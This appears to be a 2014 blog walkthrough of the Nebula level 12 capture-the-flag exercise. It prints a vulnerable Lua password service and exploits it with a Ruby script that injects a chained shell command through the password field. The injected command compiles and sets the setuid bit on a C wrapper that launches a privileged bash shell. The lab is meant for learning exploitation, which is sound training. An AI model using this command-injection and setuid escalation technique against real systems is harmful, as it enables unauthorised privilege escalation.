---
layout: post
title: "Exploit Exercises - Nebula Level 12"
date: 2014-01-26 20:12:53 +0800
comments: true
published: true
categories: 
- Security
- Exercises
- Nebula
---

### About

There is a backdoor process listening on port 50001.

To do this level, log in as the *level12* account with the password *level12*. Files for this level can be found in /home/flag12.

<!-- more -->

### Source code

``` lua /home/flag12/flag12.lua
local socketlocal socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password) 
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
    print("trying " .. line) -- log from where ;\
    local h = hash(line)

    if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
      client:send("Better luck next time\n");
    else
      client:send("Congrats, your token is 413**CARRIER LOST**\n")
    end

  end

  client:close()
end
```


### Solution 

`prog = io.popen("echo "..password.." | sha1sum", "r")` this line of code in *hash()* function try to calc the hash of the password, but we can execute any command with a well structed *password*. 

Write a simple Ruby script to send command to server, here I construct a *password* to make the server build a *drop.c* file into directory /home/flag12.

``` ruby
require 'socket'

server = TCPSocket.open("127.0.0.1", 50001)
server.puts("hello && gcc -o /home/flag12/flag12 /tmp/drop.c && chmod 777 /home/flag12/flag12 && chmod +s /home/flag12/flag12 && echo hello ")
ret = server.gets.chomp
puts "#{ret}"
```

Remenber the piece of C code we used to drop privilege? Here it is again:

``` c /tmp/drop.c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main() {
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  execv("/bin/bash", NULL);
}
```

Run the Ruby script, I got

``` bash
level12@nebula:~$ ruby client.rb
Password: Better luck next time
```

It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12

``` bash
flag12@nebula:~$ ll /home/flag12
total 14
drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
```

Here is the executable *flag12* with Set-User-ID bit, run it and a bash with *flag12* user privilege will show up!
